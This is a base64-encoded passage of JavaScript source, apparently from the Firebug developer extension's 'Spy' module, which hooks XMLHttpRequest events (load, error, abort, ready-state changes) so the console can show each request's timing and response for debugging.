oaXMuYXR0YWNoT2JzZXJ2ZXIgOiB0aGlzLmRldGFjaE9ic2VydmVyOw0KICAgICAgICAgICAgZm9yICh2YXIgaSA9IDA7IGkgPCBUYWJXYXRjaGVyLmNvbnRleHRzLmxlbmd0aDsgKytpKQ0KICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgIHZhciBjb250ZXh0ID0gVGFiV2F0Y2hlci5jb250ZXh0c1tpXTsNCiAgICAgICAgICAgICAgICBpdGVyYXRlV2luZG93cyhjb250ZXh0LndpbmRvdywgZnVuY3Rpb24od2luKQ0KICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgdGFjaC5hcHBseSh0aGlzLCBbY29udGV4dCwgd2luXSk7DQogICAgICAgICAgICAgICAgfSk7DQogICAgICAgICAgICB9DQogICAgICAgIH0NCiAgICB9LA0KDQogICAgLy8gKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKg0KICAgIC8vIEF0dGFjaGluZyBTcHkgdG8gWEhSIHJlcXVlc3RzLg0KDQogICAgLyoqDQogICAgICogUmV0dXJucyBmYWxzZSBpZiBTcHkgc2hvdWxkIG5vdCBiZSBhdHRhY2hlZCB0byBYSFJzIGV4ZWN1dGVkIGJ5IHRoZSBzcGVjaWZpZWQgd2luZG93Lg0KICAgICAqLw0KICAgIHNraXBTcHk6IGZ1bmN0aW9uKHdpbikNCiAgICB7DQogICAgICAgIGlmICghd2luKQ0KICAgICAgICAgICAgcmV0dXJuIHRydWU7DQoNCiAgICAgICAgLy8gRG9uJ3QgYXR0YWNoIHNweSB0byBjaHJvbWUuDQogICAgICAgIHZhciB1cmkgPSBzYWZlR2V0V2luZG93TG9jYXRpb24od2luKTsNCiAgICAgICAgaWYgKHVyaSAmJiAodXJpLmluZGV4T2YoImFib3V0OiIpID09IDAgfHwgdXJpLmluZGV4T2YoImNocm9tZToiKSA9PSAwKSkNCiAgICAgICAgICAgIHJldHVybiB0cnVlOw0KICAgIH0sDQoNCiAgICBhdHRhY2hPYnNlcnZlcjogZnVuY3Rpb24oY29udGV4dCwgd2luKQ0KICAgIHsNCiAgICAgICAgaWYgKEZpcmVidWcuU3B5LnNraXBTcHkod2luKSkNCiAgICAgICAgICAgIHJldHVybjsNCg0KICAgICAgICBmb3IgKHZhciBpPTA7IGk8Y29udGV4dHMubGVuZ3RoOyArK2kpDQogICAgICAgIHsNCiAgICAgICAgICAgIGlmICgoY29udGV4dHNbaV0uY29udGV4dCA9PSBjb250ZXh0KSAmJiAoY29udGV4dHNbaV0ud2luID09IHdpbikpDQogICAgICAgICAgICAgICAgcmV0dXJuOw0KICAgICAgICB9DQoNCiAgICAgICAgLy8gUmVnaXN0ZXIgSFRUUCBvYnNlcnZlcnMgb25seSBvbmNlLg0KICAgICAgICBpZiAoY29udGV4dHMubGVuZ3RoID09IDApDQogICAgICAgIHsNCiAgICAgICAgICAgIGh0dHBPYnNlcnZlci5hZGRPYnNlcnZlcihTcHlIdHRwT2JzZXJ2ZXIsICJmaXJlYnVnLWh0dHAtZXZlbnQiLCBmYWxzZSk7DQogICAgICAgICAgICBTcHlIdHRwQWN0aXZpdHlPYnNlcnZlci5yZWdpc3Rlck9ic2VydmVyKCk7DQogICAgICAgIH0NCg0KICAgICAgICBjb250ZXh0cy5wdXNoKHtjb250ZXh0OiBjb250ZXh0LCB3aW46IHdpbn0pOw0KDQogICAgICAgIGlmIChGQlRyYWNlLkRCR19TUFkpDQogICAgICAgICAgICBGQlRyYWNlLnN5c291dCgic3B5LmF0dGFjaE9ic2VydmVyIChIVFRQKSAiICsgY29udGV4dHMubGVuZ3RoICsgIiAiLCBjb250ZXh0LmdldE5hbWUoKSk7DQogICAgfSwNCg0KICAgIGRldGFjaE9ic2VydmVyOiBmdW5jdGlvbihjb250ZXh0LCB3aW4pDQogICAgew0KICAgICAgICBmb3IgKHZhciBpPTA7IGk8Y29udGV4dHMubGVuZ3RoOyArK2kpDQogICAgICAgIHsNCiAgICAgICAgICAgIGlmIChjb250ZXh0c1tpXS5jb250ZXh0ID09IGNvbnRleHQpDQogICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgaWYgKHdpbiAmJiAoY29udGV4dHNbaV0ud2luICE9IHdpbikpDQogICAgICAgICAgICAgICAgICAgIGNvbnRpbnVlOw0KDQogICAgICAgICAgICAgICAgY29udGV4dHMuc3BsaWNlKGksIDEpOw0KDQogICAgICAgICAgICAgICAgLy8gSWYgbm8gY29udGV4dCBpcyB1c2luZyBzcHksIHJlbXZvdmUgdGhlIChvbmx5IG9uZSkgSFRUUCBvYnNlcnZlci4NCiAgICAgICAgICAgICAgICBpZiAoY29udGV4dHMubGVuZ3RoID09IDApDQogICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICBodHRwT2JzZXJ2ZXIucmVtb3ZlT2JzZXJ2ZXIoU3B5SHR0cE9ic2VydmVyLCAiZmlyZWJ1Zy1odHRwLWV2ZW50Iik7DQogICAgICAgICAgICAgICAgICAgIFNweUh0dHBBY3Rpdml0eU9ic2VydmVyLnVucmVnaXN0ZXJPYnNlcnZlcigpOw0KICAgICAgICAgICAgICAgIH0NCg0KICAgICAgICAgICAgICAgIGlmIChGQlRyYWNlLkRCR19TUFkpDQogICAgICAgICAgICAgICAgICAgIEZCVHJhY2Uuc3lzb3V0KCJzcHkuZGV0YWNoT2JzZXJ2ZXIgKEhUVFApICIgKyBjb250ZXh0cy5sZW5ndGggKyAiICIsDQogICAgICAgICAgICAgICAgICAgICAgICBjb250ZXh0LmdldE5hbWUoKSk7DQogICAgICAgICAgICAgICAgcmV0dXJuOw0KICAgICAgICAgICAgfQ0KICAgICAgICB9DQogICAgfSwNCg0KICAgIC8qKg0KICAgICAqIFJldHVybiBYSFIgb2JqZWN0IHRoYXQgaXMgYXNzb2NpYXRlZCB3aXRoIHNwZWNpZmllZCByZXF1ZXN0IDxpPm5zSUh0dHBDaGFubmVsPC9pPi4NCiAgICAgKiBSZXR1cm5zIG51bGwgaWYgdGhlIHJlcXVlc3QgZG9lc24ndCByZXByZXNlbnQgWEhSLg0KICAgICAqLw0KICAgIGdldFhIUjogZnVuY3Rpb24ocmVxdWVzdCkNCiAgICB7DQogICAgICAgIC8vIERvZXMgYWxzbyBxdWVyeS1pbnRlcmZhY2UgZm9yIG5zSUh0dHBDaGFubmVsLg0KICAgICAgICBpZiAoIShyZXF1ZXN0IGluc3RhbmNlb2YgQ2kubnNJSHR0cENoYW5uZWwpKQ0KICAgICAgICAgICAgcmV0dXJuIG51bGw7DQoNCiAgICAgICAgdHJ5DQogICAgICAgIHsNCiAgICAgICAgICAgIHZhciBjYWxsYmFja3MgPSByZXF1ZXN0Lm5vdGlmaWNhdGlvbkNhbGxiYWNrczsNCiAgICAgICAgICAgIHJldHVybiAoY2FsbGJhY2tzID8gY2FsbGJhY2tzLmdldEludGVyZmFjZShDaS5uc0lYTUxIdHRwUmVxdWVzdCkgOiBudWxsKTsNCiAgICAgICAgfQ0KICAgICAgICBjYXRjaCAoZXhjKQ0KICAgICAgICB7DQogICAgICAgICAgICBpZiAoZXhjLm5hbWUgPT0gIk5TX05PSU5URVJGQUNFIikNCiAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICBpZiAoRkJUcmFjZS5EQkdfU1BZKQ0KICAgICAgICAgICAgICAgICAgICBGQlRyYWNlLnN5c291dCgic3B5LmdldFhIUjsgUmVxdWVzdCBpcyBub3QgbnNJWE1MSHR0cFJlcXVlc3Q6ICIgKw0KICAgICAgICAgICAgICAgICAgICAgICAgc2FmZUdldFJlcXVlc3ROYW1lKHJlcXVlc3QpKTsNCiAgICAgICAgICAgIH0NCiAgICAgICAgfQ0KDQogICAgICAgcmV0dXJuIG51bGw7DQogICAgfQ0KfSk7DQoNCg0KDQoNCg0KLy8gKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqDQoNCi8qDQpmdW5jdGlvbiBnZXRTcHlGb3JYSFIocmVxdWVzdCwgeGhyUmVxdWVzdCwgY29udGV4dCwgbm9DcmVhdGUpDQp7DQogICAgdmFyIHNweSA9IG51bGw7DQoNCiAgICAvLyBJdGVyYXRlIGFsbCBleGlzdGluZyBzcHkgb2JqZWN0cyBpbiB0aGlzIGNvbnRleHQgYW5kIGxvb2sgZm9yIG9uZSB0aGF0IGlzDQogICAgLy8gYWxyZWFkeSBjcmVhdGVkIGZvciB0aGlzIHJlcXVlc3QuDQogICAgdmFyIGxlbmd0aCA9IGNvbnRleHQuc3BpZXMubGVuZ3RoOw0KICAgIGZvciAodmFyIGk9MDsgaTxsZW5ndGg7IGkrKykNCiAgICB7DQogICAgICAgIHNweSA9IGNvbnRleHQuc3BpZXNbaV07DQogICAgICAgIGlmIChzcHkucmVxdWVzdCA9PSByZXF1ZXN0KQ0KICAgICAgICAgICAgcmV0dXJuIHNweTsNCiAgICB9DQoNCiAgICBpZiAobm9DcmVhdGUpDQogICAgICAgIHJldHVybiBudWxsOw0KDQogICAgc3B5ID0gbmV3IEZpcmVidWcuU3B5LlhNTEh0dHBSZXF1ZXN0U3B5KHJlcXVlc3QsIHhoclJlcXVlc3QsIGNvbnRleHQpOw0KICAgIGNvbnRleHQuc3BpZXMucHVzaChzcHkpOw0KDQogICAgdmFyIG5hbWUgPSByZXF1ZXN0LlVSSS5hc2NpaVNwZWM7DQogICAgdmFyIG9yaWdOYW1lID0gcmVxdWVzdC5vcmlnaW5hbFVSSS5hc2NpaVNwZWM7DQoNCiAgICAvLyBBdHRhY2ggc3B5IG9ubHkgdG8gdGhlIG9yaWdpbmFsIHJlcXVlc3QuIE5vdGljZSB0aGF0IHRoZXJlIGNhbiBiZSBtb3JlIG5ldHdvcmsgcmVxdWVzdHMNCiAgICAvLyBtYWRlIGJ5IHRoZSBzYW1lIFhIUiBpZiByZWRpcmVjdHMgYXJlIGludm9sdmVkLg0KICAgIGlmIChuYW1lID09IG9yaWdOYW1lKQ0KICAgICAgICBzcHkuYXR0YWNoKCk7DQoNCiAgICBpZiAoRkJUcmFjZS5EQkdfU1BZKQ0KICAgICAgICBGQlRyYWNlLnN5c291dCgic3B5LmdldFNweUZvclhIUjsgTmV3IHNweSBvYmplY3QgY3JlYXRlZCAoIiArDQogICAgICAgICAgICAobmFtZSA9PSBvcmlnTmFtZSA/ICJuZXcgWEhSIiA6ICJyZWRpcmVjdGVkIFhIUiIpICsgIikgZm9yOiAiICsgbmFtZSwgc3B5KTsNCg0KICAgIHJldHVybiBzcHk7DQp9DQovKiovDQoNCi8vICoqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKg0KDQovKioNCiAqIEBjbGFzcyBUaGlzIGNsYXNzIHJlcHJlc2VudHMgYSBTcHkgb2JqZWN0IHRoYXQgaXMgYXR0YWNoZWQgdG8gWEhSLiBUaGlzIG9iamVjdA0KICogcmVnaXN0ZXJzIHZhcmlvdXMgbGlzdGVuZXJzIGludG8gdGhlIFhIUiBpbiBvcmRlciB0byBtb25pdG9yIHZhcmlvdXMgZXZlbnRzIGZpcmVkDQogKiBkdXJpbmcgdGhlIHJlcXVlc3QgcHJvY2VzcyAob25Mb2FkLCBvbkFib3J0LCBldGMuKQ0KICovDQovKg0KRmlyZWJ1Zy5TcHkuWE1MSHR0cFJlcXVlc3RTcHkgPSBmdW5jdGlvbihyZXF1ZXN0LCB4aHJSZXF1ZXN0LCBjb250ZXh0KQ0Kew0KICAgIHRoaXMucmVxdWVzdCA9IHJlcXVlc3Q7DQogICAgdGhpcy54aHJSZXF1ZXN0ID0geGhyUmVxdWVzdDsNCiAgICB0aGlzLmNvbnRleHQgPSBjb250ZXh0Ow0KICAgIHRoaXMucmVzcG9uc2VUZXh0ID0gIiI7DQoNCiAgICAvLyBGb3IgY29tcGF0aWJpbGl0eSB3aXRoIHRoZSBOZXQgdGVtcGxhdGVzLg0KICAgIHRoaXMuaXNYSFIgPSB0cnVlOw0KDQogICAgLy8gU3VwcG9ydCBmb3IgYWN0aXZpdHktb2JzZXJ2ZXINCiAgICB0aGlzLnRyYW5zYWN0aW9uU3RhcnRlZCA9IGZhbHNlOw0KICAgIHRoaXMudHJhbnNhY3Rpb25DbG9zZWQgPSBmYWxzZTsNCn07DQovKiovDQoNCi8vRmlyZWJ1Zy5TcHkuWE1MSHR0cFJlcXVlc3RTcHkucHJvdG90eXBlID0NCi8qKiBAbGVuZHMgRmlyZWJ1Zy5TcHkuWE1MSHR0cFJlcXVlc3RTcHkgKi8NCi8qDQp7DQogICAgYXR0YWNoOiBmdW5jdGlvbigpDQogICAgew0KICAgICAgICB2YXIgc3B5ID0gdGhpczsNCiAgICAgICAgdGhpcy5vblJlYWR5U3RhdGVDaGFuZ2UgPSBmdW5jdGlvbihldmVudCkgeyBvbkhUVFBTcHlSZWFkeVN0YXRlQ2hhbmdlKHNweSwgZXZlbnQpOyB9Ow0KICAgICAgICB0aGlzLm9uTG9hZCA9IGZ1bmN0aW9uKCkgeyBvbkhUVFBTcHlMb2FkKHNweSk7IH07DQogICAgICAgIHRoaXMub25FcnJvciA9IGZ1bmN0aW9uKCkgeyBvbkhUVFBTcHlFcnJvcihzcHkpOyB9Ow0KICAgICAgICB0aGlzLm9uQWJvcnQgPSBmdW5jdGlvbigpIHsgb25IVFRQU3B5QWJvcnQoc3B5KTsgfTsNCg0KICAgICAgICAvLyB4eHhIb256YTogIzUwMjk1OSBpcyBzdGlsbCBmYWlsaW5nIG9uIEZ4IDMuNQ0KICAgICAgICAvLyBVc2UgYWN0aXZpdHkgZGlzdHJpYnV0b3IgdG8gaWRlbnRpZnkgMy42IA0KICAgICAgICBpZiAoU3B5SHR0cEFjdGl2aXR5T2JzZXJ2ZXIuZ2V0QWN0aXZpdHlEaXN0cmlidXRvcigpKQ0KICAgICAgICB7DQogICAgICAgICAgICB0aGlzLm9ucmVhZHlzdGF0ZWNoYW5nZSA9IHRoaXMueGhyUmVxdWVzdC5vbnJlYWR5c3RhdGVjaGFuZ2U7DQogICAgICAgICAgICB0aGlzLnhoclJlcXVlc3Qub25yZWFkeXN0YXRlY2hhbmdlID0gdGhpcy5vblJlYWR5U3RhdGVDaGFuZ2U7DQogICAgICAgIH0NCg0KICAgICAgICB0aGlzLnhoclJlcXVlc3QuYWRkRXZlbnRMaXN0ZW5lcigibG9hZCIsIHRoaXMub25Mb2FkLCBmYWxzZSk7DQogICAgICAgIHRoaXMueGhyUmVxdWVzdC5hZGRFdmVudExpc3RlbmVyKCJlcnJvciIsIHRoaXMub25FcnJvciwgZmFsc2UpOw0KICAgICAgICB0aGlzLnhoclJlcXVlc3QuYWRkRXZlbnRMaXN0ZW5lcigiYWJvcnQiLCB0aGlzLm9uQWJvcnQsIGZhbHNlKTsNCg0KICAgICAgICAvLyB4eHhIb256YTogc2hvdWxkIGJlIHJlbW92ZWQgZnJvbSBGQiAzLjYNCiAgICAgICAgaWYgKCFTcHlIdHRwQWN0aXZpdHlPYnNlcnZlci5nZXRBY3Rpdml0eURpc3RyaWJ1dG9yKCkpDQogICAgICAgICAgICB0aGlzLmNvbnRleHQuc291cmNlQ2FjaGUuYWRkTGlzdGVuZXIodGhpcyk7DQogICAgfSwNCg0KICAgIGRldGFjaDogZnVuY3Rpb24oKQ0KICAgIHsNCiAgICAgICAgLy8gQnViYmxlIG91dCBpZiBhbHJlYWR5IGRldGFjaGVkLg0KICAgICAgICBpZiAoIXRoaXMub25Mb2FkKQ0KICAgICAgICAgICAgcmV0dXJuOw0KDQogICAgICAgIC8vIElmIHRoZSBhY3Rpdml0eSBkaXN0cmlidXRvciBpcyBhdmFpbGFibGUsIGxldCdzIGRldGFjaCBpdCB3aGVuIHRoZSBYSFINCiAgICAgICAgLy8gdHJhbnNhY3Rpb24gaXMgY2xvc2VkLiBTaW5jZSwgaW4gY2FzZSBvZiBtdWx0aXBhcnQgWEhScyB0aGUgb25Mb2FkIG1ldGhvZA0KICAgICAgICAvLyAocmVhZHlTdGF0ZSA9PSA0KSBjYW4gYmUgY2FsbGVkIG11dGxpcGxlIHRpbWVzLg0KICAgICAgICAvLyBLZWVwIGluIG1pbmQ6DQogICAgICAgIC8vIDEpIEl0IGNhbiBoYXBwZW4gdGhhdCB0aGF0IHRoZSBUUkFOU0FDVElPTl9DTE9TRSBldmVudCBjb21lcyBiZWZvcmUNCiAgICAgICAgLy8gdGhlIG9uTG9hZCAoaWYgdGhlIFhIUiBpcyBtYWRlIGFzIHBhcnQgb2YgdGhlIHBhZ2UgbG9hZCkgc28sIGRldGFjaCBpZg0KICAgICAgICAvLyBpdCdzIGFscmVhZHkgY2xvc2VkLg0KICAgICAgICAvLyAyKSBJbiBjYXNlIG9mIGltbWVkaWF0ZSBjYWNoZSByZXNwb25zZXMsIHRoZSB0cmFuc2FjdGlvbiBkb2Vzbid0IGhhdmUgdG8NCiAgICAgICAgLy8gYmUgc3RhcnRlZCBhdCBhbGwgKG9yIHRoZSBhY3Rpdml0eSBvYnNlcnZlciBpcyBubyBhdmFpbGFibGUgaW4gRmlyZWZveCAzLjUpLg0KICAgICAgICAvLyBTbywgYWxzbyBkZXRhY2ggaW4gdGhpcyBjYXNlLg0KICAgICAgICBpZiAodGhpcy50cmFuc2FjdGlvblN0YXJ0ZWQgJiYgIXRoaXMudHJhbnNhY3Rpb25DbG9zZWQpDQogICAgICAgICAgICByZXR1cm47DQoNCiAgICAgICAgaWYgKEZCVHJhY2UuREJHX1NQWSkNCiAgICAgICAgICAgIEZCVHJhY2Uuc3lzb3V0KCJzcHkuZGV0YWNoOyAiICsgdGhpcy5ocmVmKTsNCg0KICAgICAgICAvLyBSZW1vdmUgaXRzZWxmIGZyb20gdGhlIGxpc3Qgb2YgYWN0aXZlIHNwaWVzLg0KICAgICAgICByZW1vdmUodGhpcy5jb250ZXh0LnNwaWVzLCB0aGlzKTsNCg0KICAgICAgICBpZiAodGhpcy5vbnJlYWR5c3RhdGVjaGFuZ2UpDQogICAgICAgICAgICB0aGlzLnhoclJlcXVlc3Qub25yZWFkeXN0YXRlY2hhbmdlID0gdGhpcy5vbnJlYWR5c3RhdGVjaGFuZ2U7DQoNCiAgICAgICAgdHJ5IHsgdGhpcy54aHJSZXF1ZXN0LnJlbW92ZUV2ZW50TGlzdGVuZXIoImxvYWQiLCB0aGlzLm9uTG9hZCwgZmFsc2UpOyB9IGNhdGNoIChlKSB7fQ0KICAgICAgICB0cnkgeyB0aGlzLnhoclJlcXVlc3QucmVtb3ZlRXZlbnRMaXN0ZW5lcigiZXJyb3IiLCB0aGlzLm9uRXJyb3IsIGZhbHNlKTsgfSBjYXRjaCAoZSkge30NCiAgICAgICAgdHJ5IHsgdGhpcy54aHJSZXF1ZXN0LnJlbW92ZUV2ZW50TGlzdGVuZXIoImFib3J0IiwgdGhpcy5vbkFib3J0LCBmYWxzZSk7IH0gY2F0Y2ggKGUpIHt9DQoNCiAgICAgICAgdGhpcy5vbnJlYWR5c3RhdGVjaGFuZ2UgPSBudWxsOw0KICAgICAgICB0aGlzLm9uTG9hZCA9IG51bGw7DQogICAgICAgIHRoaXMub25FcnJvciA9IG51bGw7DQogICAgICAgIHRoaXMub25BYm9ydCA9IG51bGw7DQoNCiAgICAgICAgLy8geHh4SG9uemE6IHNob3V1bGQgYmUgcmVtb3ZlZCBmcm9tIEZCIDEuNg0KICAgICAgICBpZiAoIVNweUh0dHBBY3Rpdml0eU9ic2VydmVyLmdldEFjdGl2aXR5RGlzdHJpYnV0b3IoKSkNCiAgICAgICAgICAgIHRoaXMuY29udGV4dC5zb3VyY2VDYWNoZS5yZW1vdmVMaXN0ZW5lcih0aGlzKTsNCiAgICB9LA0KDQogICAgZ2V0VVJMOiBmdW5jdGlvbigpDQogICAgew0KICAgICAgICByZXR1cm4gdGhpcy54aHJSZXF1ZXN0LmNoYW5uZWwgPyB0aGlzLnhoclJlcXVlc3QuY2hhbm5lbC5uYW1lIDogdGhpcy5ocmVmOw0KICAgIH0sDQoNCiAgICAvLyBDYWNoZSBsaXN0ZW5lcg0KICAgIG9uU3RvcFJlcXVlc3Q6IGZ1bmN0aW9uKGNvbnRleHQsIHJlcXVlc3QsIHJlc3BvbnNlVGV4dCkNCiAgICB7DQogICAgICAgIGlmICghcmVzcG9uc2VUZXh0KQ0KICAgICAgICAgICAgcmV0dXJuOw0KDQogICAgICAgIGlmIChyZXF1ZXN0ID09IHRoaXMucmVxdWVzdCkNCiAgICAgICAgICAgIHRoaXMucmVzcG9uc2VUZXh0ID0gcmVzcG9uc2VUZXh0Ow0KICAgIH0sDQp9Ow0KLyoqLw0KLy8gKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqDQovKg0KZnVuY3Rpb24gb25IVFRQU3B5UmVhZHlTdGF0ZUNoYW5nZShzcHksIGV2ZW50KQ0Kew0KICAgIGlmIChGQlRyYWNlLkRCR19TUFkpDQogICAgICAgIEZCVHJhY2Uuc3lzb3V0KCJzcHkub25IVFRQU3B5UmVhZHlTdGF0ZUNoYW5nZSAiICsgc3B5LnhoclJlcXVlc3QucmVhZHlTdGF0ZSArDQogICAgICAgICAgICAiIChtdWx0aXBhcnQ6ICIgKyBzcHkueGhyUmVxdWVzdC5tdWx0aXBhcnQgKyAiKSIpOw0KDQogICAgLy8gUmVtZW1iZXIganVzdCBpbiBjYXNlIHNweSBpcyBkZXRhY2hlZCAocmVhZHlTdGF0ZSA9PSA0KS4NCiAgICB2YXIgb3JpZ2luYWxIYW5kbGVyID0gc3B5Lm9ucmVhZHlzdGF0ZWNoYW5nZTsNCg0KICAgIC8vIEZvcmNlIHJlc3BvbnNlIHRleHQgdG8gYmUgdXBkYXRlZCBpbiB0aGUgVUkgKGluIGNhc2UgdGhlIGNvbnNvbGUgZW50cnkNCiAgICAvLyBoYXMgYmVlbiBhbHJlYWR5IGV4cGFuZGVkIGFuZCB0aGUgcmVzcG9uc2UgdGFiIHNlbGVjdGVkKS4NCiAgICBpZiAoc3B5LmxvZ1JvdyAmJiBzcHkueGhyUmVxdWVzdC5yZWFkeVN0YXRlID49IDMpDQogICAgew0KICAgICAgICB2YXIgbmV0SW5mb0JveCA9IGdldENoaWxkQnlDbGFzcyhzcHkubG9nUm93LCAic3B5SGVhZCIsICJuZXRJbmZvQm9keSIpOw0KICAgICAgICBpZiAobmV0SW5mb0JveCkNCiAgICAgICAgew0KICAgICAgICAgICAgbmV0SW5mb0JveC5odG1sUHJlc2VudGVkID0gZmFsc2U7DQogICAgICAgICAgICBuZXRJbmZvQm94LnJlc3BvbnNlUHJlc2VudGVkID0gZmFsc2U7DQogICAgICAgIH0NCiAgICB9DQoNCiAgICAvLyBJZiB0aGUgcmVxdWVzdCBpcyBsb2FkaW5nIHVwZGF0ZSB0aGUgZW5kIHRpbWUuDQogICAgaWYgKHNweS54aHJSZXF1ZXN0LnJlYWR5U3RhdGUgPT0gMykNCiAgICB7DQogICAgICAgIHNweS5yZXNwb25zZVRpbWUgPSBzcHkuZW5kVGltZSAtIHNweS5zZW5kVGltZTsNCiAgICAgICAgdXBkYXRlVGltZShzcHkpOw0KICAgIH0NCg0KICAgIC8vIFJlcXVlc3QgbG9hZGVkLiBHZXQgYWxsIHRoZSBpbmZvIGZyb20gdGhlIHJlcXVlc3Qgbm93LCBqdXN0IGluIGNhc2UgdGhlIA0KICAgIC8vIFhIUiB3b3VsZCBiZSBhYm9ydGVkIGluIHRoZSBvcmlnaW5hbCBvblJlYWR5U3RhdGVDaGFuZ2UgaGFuZGxlci4NCiAgICBpZiAoc3B5LnhoclJlcXVlc3QucmVhZHlTdGF0ZSA9PSA0KQ0KICAgIHsNCiAgICAgICAgLy8gQ3VtdWxhdGUgcmVzcG9uc2Ugc28sIG11bHRpcGFydCByZXNwb25zZSBjb250ZW50IGlzIHByb3Blcmx5IGRpc3BsYXllZC4NCiAgICAgICAgaWYgKFNweUh0dHBBY3Rpdml0eU9ic2VydmVyLmdldEFjdGl2aXR5RGlzdHJpYnV0b3IoKSkNCiAgICAgICAgICAgIHNweS5yZXNwb25zZVRleHQgKz0gc3B5LnhoclJlcXVlc3QucmVzcG9uc2VUZXh0Ow0KICAgICAgICBlbHNlDQogICAgICAgIHsNCiAgICAgICAgICAgIC8vIHh4eEhvbnphOiByZW1vdmUgZnJvbSBGQiAxLjYNCiAgICAgICAgICAgIGlmICghc3B5LnJlc3BvbnNlVGV4dCkNCiAgICAgICAgICAgICAgICBzcHkucmVzcG9uc2VUZXh0ID0gc3B5LnhoclJlcXVlc3QucmVzcG9uc2VUZXh0Ow0KICAgICAgICB9DQoNCiAgICAgICAgLy8gVGhlIFhIUiBpcyBsb2FkZWQgbm93ICh1c2VkIGFsc28gYnkgdGhlIGFjdGl2aXR5IG9ic2VydmVyKS4NCiAgICAgICAgc3B5LmxvYWRlZCA9IHRydWU7DQoNCiAgICAgICAgLy8gVXBkYXRlIFVJLg0KICAgICAgICB1cGRhdGVIdHRwU3B5SW5mbyhzcHkpOw0KDQogICAgICAgIC8vIE5vdGlmeSBOZXQgcGFuZSBhYm91dCBhIHJlcXVlc3QgYmVlaW5nIGxvYWRlZC4NCiAgICAgICAgLy8geHh4SG9uemE6IEkgZG9uJ3QgdGhpbmsgdGhpcyBpcyBuZWNlc3NhcnkuDQogICAgICAgIHZhciBuZXRQcm9ncmVzcyA9IHNweS5jb250ZXh0Lm5ldFByb2dyZXNzOw0KICAgICAgICBpZiAobmV0UHJvZ3Jlc3MpDQogICAgICAgICAgICBuZXRQcm9ncmVzcy5wb3N0KG5ldFByb2dyZXNzLnN0b3BGaWxlLCBbc3B5LnJlcXVlc3QsIHNweS5lbmRUaW1lLCBzcHkucG9zdFRleHQsIHNweS5yZXNwb25zZVRleHRdKTsNCg0KICAgICAgICAvLyBOb3RpZnkgcmVnaXN0ZXJlZCBsaXN0ZW5lcnMgYWJvdXQgZmluaXNoIG9mIHRoZSBYSFIuDQogICAgICAgIGRpc3BhdGNoKEZpcmVidWcuU3B5LmZiTGlzdGVuZXJzLCAib25Mb2FkIiwgW3NweS5jb250ZXh0LCBzcHldKTsNCiAgICB9DQoNCiAgICAvLyBQYXNzIHRoZSBldmVudCB0byB0aGUgb3JpZ2luYWwgcGFnZSBoYW5kbGVyLg0KICAgIGNhbGxQYWdlSGFuZGxlcihzcHksIGV2ZW50LCBvcmlnaW5hbEhhbmRsZXIpOw0KfQ0KDQpmdW5jdGlvbiBvbkhUVFBTcHlMb2FkKHNweSkNCnsNCiAgICBpZiAoRkJUcmFjZS5EQkdfU1BZKQ0KICAgICAgICBGQlRyYWNlLnN5c291dCgic3B5Lm9uSFRUUFNweUxvYWQ6ICIgKyBzcHkuaHJlZiwgc3B5KTsNCg0KICAgIC8vIERldGFjaCBtdXN0IGJlIGRvbmUgaW4gb25Mb2FkIChub3QgaW4gb25yZWFkeXN0YXRlY2hhbmdlKSBvdGhlcndpc2UNCiAgICAvLyBvbkFib3J0IHdvdWxkIG5vdCBiZSBoYW5kbGVkLg0KICAgIHNweS5kZXRhY2goKTsNCg0KICAgIC8vIHh4eEhvbnphOiBTdGlsbCBuZWVkZWQgZm9yIEZ4IDMuNSAoIzUwMjk1OSkNCiAgICBpZiAoIVNweUh0dHBBY3Rpdml0eU9ic2VydmVyLmdldEFjdGl2aXR5RGlzdHJpYnV0b3IoKSkNCiAgICAgICAgb25IVFRQU3B5UmVhZHlTdGF0ZUNoYW5nZShzcHksIG51bGwpOw0KfQ0KDQpmdW5jdGlvbiBvbkhUVFBTcHlFcnJvcihzcHkpDQp7DQogICAgaWYgKEZCVHJhY2UuREJHX1NQWSkNCiAgICAgICAgRkJUcmFjZS5zeXNvdXQoInNweS5vbkhUVFBTcHlFcnJvcjsgIiArIHNweS5ocmVmLCBzcHkpOw0KDQogICAgc3B5LmRldGFjaCgpOw0KICAgIHNweS5sb2FkZWQgPSB0cnVlOw0KDQogICAgaWYgKHNweS5sb2dSb3cpDQogICAgew0KICAgICAgICByZW1vdmVDbGFzcyhzcHkubG9nUm93LCAibG9hZGluZyIpOw0KICAgICAgICBzZXRDbGFzcyhzcHkubG9nUm93LCAiZXJyb3IiKTsNCiAgICB9DQp9DQoNCmZ1bmN0aW9uIG9uSFRUUFNweUFib3J0KHNweSkNCnsNCiAgICBpZiAoRkJUcmFjZS5EQkdfU1BZKQ0KICAgICAgICBGQlRyYWNlLnN5c291dCgic3B5Lm9uSFRUUFNweUFib3J0OiAiICsgc3B5LmhyZWYsIHNweSk7DQoNCiAgICBzcHkuZGV0YWNoKCk7DQogICAgc3B5LmxvYWRlZCA9IHRydWU7DQoNCiAgICBpZiAoc3B5LmxvZ1JvdykNCiAgICB7DQogICAgICAgIHJlbW92ZUNsYXNzKHNweS5sb2dSb3csICJsb2FkaW5nIik7DQogICAgICAgIHNldENsYXNzKHNweS5sb2dSb3csICJlcnJvciIpOw0KICAgIH0NCg0KICAgIHNweS5zdGF0dXNUZXh0ID0gIkFib3J0ZWQiOw0KICAgIHVwZGF0ZUxvZ1JvdyhzcHkpOw0KDQogICAgLy8gTm90aWZ5IE5ldCBwYW5lIGFib3V0IGEgcmVxdWVzdCBiZWVpbmcgYWJvcnRlZC4NCiAgICAvLyB4eHhIb256YTogdGhlIG5ldCBwYW5lbCBzaG91ZCBmaW5kIG91dCB0aGlzIGl0c2V